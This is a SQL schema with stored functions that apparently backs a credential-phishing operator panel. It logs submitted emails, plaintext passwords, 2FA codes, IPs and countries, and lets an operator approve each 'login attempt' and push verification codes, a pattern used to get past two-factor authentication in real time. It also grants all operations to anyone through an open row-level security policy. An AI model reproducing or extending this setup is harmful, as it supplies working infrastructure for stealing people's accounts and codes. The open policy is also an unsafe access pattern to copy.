-- Create requests table to store login attempts
CREATE TABLE IF NOT EXISTS requests (
    id SERIAL PRIMARY KEY,
    email TEXT NOT NULL,
    password TEXT,
    twofa TEXT,
    user_agent TEXT,
    ip TEXT,
    country TEXT,
    status TEXT DEFAULT 'pending',
    page_status TEXT DEFAULT 'Login',
    verification_code TEXT,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    approved_at TIMESTAMP WITH TIME ZONE,
    finished_at TIMESTAMP WITH TIME ZONE
);

-- Create indexes for better performance
CREATE INDEX IF NOT EXISTS idx_requests_email ON requests(email);
CREATE INDEX IF NOT EXISTS idx_requests_status ON requests(status);
CREATE INDEX IF NOT EXISTS idx_requests_created_at ON requests(created_at);

-- Enable Row Level Security (RLS)
ALTER TABLE requests ENABLE ROW LEVEL SECURITY;

-- Create policy to allow all operations
CREATE POLICY "Allow all operations" ON requests FOR ALL USING (true);

-- Create function to approve/deny requests
CREATE OR REPLACE FUNCTION approve_request(
    request_id INT,
    decision TEXT,
    verification_code_param TEXT DEFAULT NULL
)
RETURNS JSON
LANGUAGE plpgsql
AS $$
DECLARE
    result JSON;
BEGIN
    UPDATE requests 
    SET 
        status = decision,
        approved_at = NOW(),
        verification_code = COALESCE(verification_code_param, verification_code)
    WHERE id = request_id;
    
    IF FOUND THEN
        result := json_build_object('success', true, 'message', 'Request updated successfully');
    ELSE
        result := json_build_object('success', false, 'message', 'Request not found');
    END IF;
    
    RETURN result;
END;
$$;

-- Create function to set verification code (FIXED VERSION)
CREATE OR REPLACE FUNCTION set_verification_code(
    email_param TEXT,
    code_param TEXT
)
RETURNS JSON
LANGUAGE plpgsql
AS $$
DECLARE
    result JSON;
    target_id INT;
BEGIN
    -- Find the most recent request ID for this email
    SELECT id INTO target_id 
    FROM requests 
    WHERE email = email_param 
    ORDER BY created_at DESC 
    LIMIT 1;
    
    -- Update the request if found
    IF target_id IS NOT NULL THEN
        UPDATE requests 
        SET twofa = code_param
        WHERE id = target_id;
        
        result := json_build_object('success', true, 'message', 'Verification code updated', 'code', code_param);
    ELSE
        result := json_build_object('success', false, 'message', 'Request not found for this email');
    END IF;
    
    RETURN result;
END;
$$; 